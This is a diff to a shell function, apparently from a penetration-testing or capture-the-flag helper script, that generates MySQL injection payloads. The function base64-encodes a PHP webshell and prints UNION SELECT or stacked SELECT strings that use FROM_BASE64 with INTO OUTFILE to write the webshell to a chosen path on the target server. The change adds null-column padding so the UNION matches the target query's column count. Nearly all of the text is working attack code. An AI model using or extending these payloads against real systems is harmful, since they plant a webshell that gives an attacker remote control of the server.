@@ -95,7 +95,6 @@ get_mysql_injection() {
         webshell=$(cat webshell.php)
     fi
     webshell=$(minimize_script "$webshell")
-    echo "$webshell" > test.php
     webshell=$(echo "$webshell" | base64 -w 0)
 
     if [[ ! -z "$2" ]]; then
@@ -113,14 +112,25 @@ get_mysql_injection() {
     if [[ -z "$num_sql_front_null" ]]; then
         num_sql_front_null=0
     fi
-    local back_null_values=""
-    for ((i=1; i<=num_sql_back_null; i++)); do
-        back_null_values+=", null"
-    done
+    if [[ -z $null_value ]]; then
+        null_value="null"
+    fi
+    if [[ -z $back_null_values ]]; then
+        for ((i=1; i<=num_sql_back_null; i++)); do
+            back_null_values+=", $null_value"
+        done        
+    fi
+    if [[ -z $front_null_values ]]; then
+        for ((i=1; i<=num_sql_front_null; i++)); do
+            front_null_values+="$null_value, "
+        done        
+
+    fi
+    #into is not allowed inside subqueries, so we have to do union select
     if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
-        echo  " UNION SELECT FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+        echo  " UNION SELECT $front_null_values FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     else
-        echo  " ;Select FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
+        echo  " ;SELECT FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     fi
 }
 
